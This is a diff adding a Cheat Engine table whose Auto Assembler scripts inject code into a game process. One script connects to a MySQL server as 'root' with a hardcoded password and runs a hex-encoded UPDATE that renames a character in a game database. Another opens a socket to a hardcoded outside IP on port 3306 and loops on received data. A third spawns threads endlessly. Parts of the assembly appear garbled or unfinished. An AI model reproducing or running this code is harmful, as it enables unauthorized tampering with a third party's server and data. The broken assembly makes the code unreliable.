@@ -1,0 +1,585 @@
+<?xml version="1.0" encoding="utf-8"?>
+<CheatTable CheatEngineTableVersion="38">
+  <CheatEntries>
+    <CheatEntry>
+      <ID>0</ID>
+      <Description>"mysql 연결 코어"</Description>
+      <LastState/>
+      <VariableType>Auto Assembler Script</VariableType>
+      <AssemblerScript>[ENABLE]
+00903500:
+db 55 50 44 41 54 45 20 60 6F 72 69 6F 6E 61 6C 70 68 61 60 2E 60 63 68 61 72 61 63 74 65 72 60 20 53 45 54 20 60 43 68 61 72 61 63 74 65 72 4E 61 6D 65 60 3D 27 33 33 32 32 32 33 27 20 57 48 45 52 45 20 60 43 68 61 72 61 63 74 65 72 49 44 60 3D 27 32 27 3B 00 3D 27 32 27 3B
+//code from here to '[DISABLE]' will be used to enable the cheat
+00907100:
+db 'root'
+00901300:
+db 'ok' 0A 00
+00901600:
+db 'aa080808' 00 00
+label(roots)
+00901000:
+push 00 { 0 }
+push 00 { 0 }
+push 00000CEA { 3306 }
+push 00 { 0 }
+push 00901600 { ("root") }
+push 00907100 { ("root") }
+push 00 { 0 }
+push 00402000
+call libmySQL.mysql_real_connect
+
+push 00903500
+push 00402000
+call LIBMYSQL.mysql_query
+ret
+
+roots:
+ret
+
+CreateThread(00901000)
+
+
+[DISABLE]
+//code from here till the end of the code will be used to disable the cheat
+</AssemblerScript>
+    </CheatEntry>
+    <CheatEntry>
+      <ID>1</ID>
+      <Description>"서버 소캣 연결 코어"</Description>
+      <LastState/>
+      <VariableType>Auto Assembler Script</VariableType>
+      <AssemblerScript>[ENABLE]
+//0
+//6
+//
+define(ips,02401900)
+Registersymbol(ips)
+define(diret,02401A00)
+Registersymbol(diret)
+define(woncode,02403200)
+Registersymbol(woncode)
+define(Thre,02401C00)
+Registersymbol(Thre)
+label(put)
+label(put2)
+define(terminte,02401D00)
+Registersymbol(terminte)
+define(inttuerpt1,02401E00)
+Registersymbol(inttuerpt1)
+define(petman1,02402200)
+Registersymbol(petman1)
+define(petman2,02402400)
+Registersymbol(petman2)
+define(petman3,02402600)
+Registersymbol(petman3)
+define(petman4,02402800)
+Registersymbol(petman4)
+define(calldefine,02402A00)
+Registersymbol(calldefine)
+define(mian,02401000)
+Registersymbol(mian)
+define(saves,02405A00)
+Registersymbol(calldefine)
+define(calde,02406A00)
+Registersymbol(calldefine)
+label(loop2)
+
+ips:
+db '222.239.225.43' 00
+diret:
+repne jne diret+4
+repne ret
+push ebp
+mov ebp,esp
+sub esp,00
+push eax
+
+Thre:
+push ebp
+mov ebp,esp
+sub esp,08
+mov [ebp-04],ecx
+mov eax,[ebp-04]
+mov [ebp-08],eax
+mov ecx,[ebp-04]
+cmp ecx,0
+je put2
+movzx edx,byte ptr [ecx]
+test edx,edx
+je put
+call kernel32.GetCurrentThreadId//kernel32.GetCurrentThreadId//dword ptr [Thid]// GetCurrentThreadId
+jne put
+nop
+put:
+mov esp,ebp
+pop ebp
+ret
+put2:
+push 00
+push fffffffE
+call TerminateThread
+ret
+woncode:
+db 01 01 01 01 01 01 01 01 01 01
+
+woncode+60:
+db 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01
+
+woncode+ff:
+db 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01
+
+woncode-10:
+dd F3C43878
+
+mian:
+push ebp
+mov ebp,esp
+push -01 { 255 }
+nop
+nop
+nop
+nop
+nop
+mov eax,fs:[00000000] { 0 }
+push eax
+sub esp,000009E0 { 2528 }
+push ebx
+push esi
+push edi
+lea edi,[ebp-000009EC]
+mov ecx,00000278 { 632 }
+mov eax,CCCCCCCC { -858993460 }
+repe stosd
+nop
+nop
+nop
+nop
+nop
+xor eax,ebp
+mov [ebp-10],eax
+push eax
+lea eax,[ebp-0C]
+mov fs:[00000000],eax { 0 }
+mov [ebp-000009C4],00000000 { 0 }
+mov ecx,woncode { (1) } //woncode
+call Thre// //Thre
+mov esi,esp
+lea eax,[ebp-000001A4]
+push eax
+push 00000202 { 514 }
+call WS2_32.WSAStartup //dword ptr [apimd5.exe+271C4] { -&gt;WS2_32.WSAStartup }
+cmp esi,esp
+call diret//diret
+test eax,eax
+je ret1 //ret1
+mov eax,00000001 { 1 }
+ret ///////////////-*****---
+ret1:
+mov esi,esp
+push 00 { 0 }
+push 01 { 1 }
+push 02 { 2 }
+call WS2_32.socket//dword ptr [apimd5.exe+271C8] { -&gt;WS2_32.socket }
+cmp esi,esp
+call diret //diret
+mov [ebp-000001B0],eax
+mov [02405A00],eax
+push 10 { 00000010 }
+push 00 { 0 }
+lea eax,[ebp-000001C8]
+push eax
+call msvcrt.memset
+ //VCRUNTIME140D.memset
+add esp,0C { 12 }
+mov eax,00000002 { 2 }
+mov [ebp-000001C8],ax
+mov esi,esp
+push ips { ("127.0.0.1") }
+call WS2_32.inet_addr //dword ptr [apimd5.exe+271D4] { -&gt;WS2_32.inet_addr }
+cmp esi,esp
+call diret //diret
+mov [ebp-000001C4],eax
+mov esi,esp
+push #3306
+//push #9090 { 9090 } //port
+call WS2_32.htons//dword ptr [apimd5.exe+271D8] { -&gt;WS2_32.htons }
+cmp esi,esp
+call diret
+mov [ebp-000001C6],ax
+mov esi,esp
+push 10 { 00000010 }
+lea eax,[ebp-000001C8]
+push eax
+mov ecx,[ebp-000001B0]
+push ecx
+call WS2_32.connect //dword ptr [apimd5.exe+271DC] { -&gt;WS2_32.connect }
+cmp esi,esp
+call diret//apimd5.exe+114C9
+push 10
+lea ecx,[ebp-000001E0]
+call inttuerpt1
+lea ecx,[ebp-000001E0]
+//call calldefine //sim
+mov [ebp-04],00000000
+mov eax,00000001
+test eax,eax
+je terminte
+push 00
+push 01
+lea eax,[ebp-000001E9]
+push eax
+mov ecx,[ebp-000001B0] //
+push ecx
+call WS2_32.recv //{ -&gt;WS2_32.recv } 004188A7
+push 0
+push 0
+push calde
+push calde
+push 0
+push 0
+call createThread
+push 00
+push fffffffE
+call TerminateThread
+ret
+
+terminte:
+push 00
+push fffffffE
+call TerminateThread
+ret
+
+//00414E30 // //String cmd 생성
+calldefine:
+push ebp
+mov ebp,esp
+push -01 { 255 }
+push 00401000//apimd5.exe+1E210 //XXXXXXX
+mov eax,fs:[00000000] { 0 }
+push eax
+sub esp,000000E4 { 228 }
+push ebx
+push esi
+push edi
+push ecx
+lea edi,[ebp-000000F0]
+mov ecx,00000039 { 57 }
+mov eax,CCCCCCCC { -858993460 }
+repe stosd
+pop ecx
+mov eax,[00400000+25008][woncode-10] ////////woncode-10 B206F0
+xor eax,ebp
+push eax
+lea eax,[ebp-0C]
+mov fs:[00000000],eax { 0 }
+mov [ebp-14],ecx
+mov ecx,woncode+1{ (16843009) } //1 9
+call Thre
+movzx eax,byte ptr [ebp-000000DD]
+push eax
+mov ecx,[ebp-14]
+
+
+
+///////////////////gotoa
+call petman1
+mov ecx,[ebp-14]
+call petman2
+push eax
+lea ecx,[ebp-000000E9]
+
+push eax
+mov ecx,[ebp-14]
+
+mov eax,[ebp-14]
+mov ecx,[ebp-0C]
+mov fs:[00000000],ecx { 0 }
+pop ecx
+pop edi
+pop esi
+pop ebx
+add esp,000000F0 { 240 }
+cmp ebp,esp
+call diret
+mov esp,ebp
+pop ebp
+ret
+
+
+
+petman1:
+push ebp
+mov ebp,esp
+sub esp,000000CC
+push ebx
+push esi
+push edi
+push ecx
+lea edi,[ebp-000000CC]
+mov ecx,00000033
+mov eax,CCCCCCCC
+repe stosd
+pop ecx
+mov [ebp-08],ecx
+mov ecx,woncode+60
+call Thre
+mov ecx,[ebp-08]
+call petman2 //petman2
+mov ecx,[ebp-08]
+call petman3 //petf
+mov eax,[ebp-08]
+pop edi
+pop esi
+pop ebx
+add esp,000000CC
+cmp ebp,esp
+call diret
+mov esp,ebp
+pop ebp
+ret 0004
+
+petman2:
+push ebp
+mov ebp,esp
+sub esp,000000CC
+push ebx
+push esi
+push edi
+push ecx
+lea edi,[ebp-000000CC]
+mov ecx,00000033
+mov eax,CCCCCCCC
+repe stosd
+pop ecx
+mov [ebp-08],ecx
+mov ecx,woncode+60
+call Thre//call Thre
+mov eax,[ebp-08]
+pop edi
+pop esi
+pop ebx
+add esp,000000CC
+cmp ebp,esp
+call diret
+mov esp,ebp
+pop ebp
+ret
+
+
+petman3:
+push ebp
+mov ebp,esp
+sub esp,000000CC
+push ebx
+push esi
+push edi
+push ecx
+lea edi,[ebp-000000CC]
+mov ecx,00000033
+mov eax,CCCCCCCC
+repe stosd
+pop ecx
+mov [ebp-08],ecx
+mov ecx,woncode+1 //9
+call Thre
+mov ecx,[ebp-08]
+call petman4 //apimd5.exe+11311
+mov eax,[ebp-08]
+mov [eax+04],00000000
+mov eax,[ebp-08]
+mov [eax+08],00000000
+mov eax,[ebp-08]
+mov [eax+0C],00000000
+mov eax,[ebp-08]
+pop edi
+pop esi
+pop ebx
+add esp,000000CC
+cmp ebp,esp
+call diret //apimd5.exe+1147E
+mov esp,ebp
+pop ebp
+ret
+
+
+
+petman4:
+push ebp
+mov ebp,esp
+sub esp,000000CC
+push ebx
+push esi
+push edi
+push ecx
+lea edi,[ebp-000000CC]
+mov ecx,00000033
+mov eax,CCCCCCCC
+repe stosd
+pop ecx
+mov [ebp-08],ecx
+mov ecx,woncode+ff
+call Thre
+mov eax,[ebp-08]
+mov [eax],00000000
+mov eax,[ebp-08]
+pop edi
+pop esi
+pop ebx
+add esp,000000CC
+cmp ebp,esp
+call diret
+mov esp,ebp
+pop ebp
+ret
+
+
+
+
+
+inttuerpt1:
+push ebp
+mov ebp,esp
+sub esp,000000CC
+push ebx
+push esi
+push edi
+push ecx
+lea edi,[ebp-000000CC]
+mov ecx,00000033
+mov eax,CCCCCCCC
+repe stosd
+pop ecx
+mov [ebp-08],ecx
+mov eax,[ebp+08]
+push eax
+push 00
+mov ecx,[ebp-08]
+push ecx
+call msvcrt.memset //msvcrt.memset
+add esp,0C
+pop edi
+pop esi
+pop ebx
+add esp,000000CC
+cmp ebp,esp
+call diret
+mov esp,ebp
+pop ebp
+ret 0004
+
+calde:
+mov ebp,esp
+push -01 { 255 }
+push 00401000 { (1418432656) }
+mov eax,fs:[00000000] { 0 }
+push eax
+sub esp,00000670 { 1648 }
+push ebx
+push esi
+push edi
+lea edi,[ebp-0000067C]
+mov ecx,0000019C { 412 }
+mov eax,CCCCCCCC { -858993460 }
+repe stosd
+//mov eax,[apimd5.exe+24008] { (-550970636) }
+xor eax,ebp
+mov [ebp-10],eax
+push eax
+lea eax,[ebp-0C]
+mov fs:[00000000],eax { 0 }
+mov ecx,woncode+1//0042703B//00402700{ (1) } //9
+call Thre
+
+//cahr생성
+push 00000400 { 1024 }
+push 00 { 0 }
+lea eax,[ebp-00000414]
+push eax
+call msvcrt.memset//memset
+add esp,0C { 12 }
+
+//String cmd 생성
+lea ecx,[ebp-00000438]
+//call calldefine
+mov [ebp-04],00000000 { 0 }
+loop2:
+//while !WSAGEtLasetError()
+mov esi,esp
+call kernel32.GetLastError//[apimd5.exe+251E0] { -&gt;-&gt;kernel32.GetLastError }
+cmp esi,esp
+call diret//apimd5.exe+1150F
+//ZeroMemory(nuffer,Pcket__size) 버퍼 비우기
+push 00000400 { 1024 }
+push 00 { 0 }
+lea eax,[ebp-00000414]
+push eax
+call msvcrt.memset//memsetapimd5.exe+11352
+add esp,0C { 12 }
+
+// recv데[이터 받아오기
+mov esi,esp
+push 00 { 0 }
+push 00000400 { 1024 } //사이즈
+lea eax,[ebp-00000414]
+push eax //저장내용물
+mov ecx,[02405A00] { (128) }
+push ecx //
+call WS2_32.recv // dword ptr [apimd5.exe+251F4] { -&gt;WS2_32.recv }
+cmp esi,esp
+call diret
+jmp loop2
+
+
+
+
+ret2:
+push #210000000
+call sleep
+CreateThread(02401000)
+[DISABLE]
+
+</AssemblerScript>
+    </CheatEntry>
+    <CheatEntry>
+      <ID>2</ID>
+      <Description>"전송 코어"</Description>
+      <LastState/>
+      <VariableType>Auto Assembler Script</VariableType>
+      <AssemblerScript>[ENABLE]
+//code from here to '[DISABLE]' will be used to enable the cheat
+
+//0041E2A5
+alloc(packet,448)
+Registersymbol(packet)
+Registersymbol(main2)
+alloc(main2,412)
+
+packet:
+db 33 33 61 73 66 61 66 61 73 73 66 61 61 73 66 73 66 61 61 66 73 61 66 61 67 73 00 0D 0A
+createThread(main2)
+
+
+
+main2:
+push 0
+push 0
+push 02400000
+push 02401000
+push 0
+push 0
+call createThread
+push eax
+call KERNEL32.CloseHandle
+push 3
+call sleep
+jmp main2
+ret
+
+
+[DISABLE]
+//code from here till the end of the code will be used to disable the cheat
+</AssemblerScript>
+    </CheatEntry>
+  </CheatEntries>
+  <UserdefinedSymbols/>
+</CheatTable>
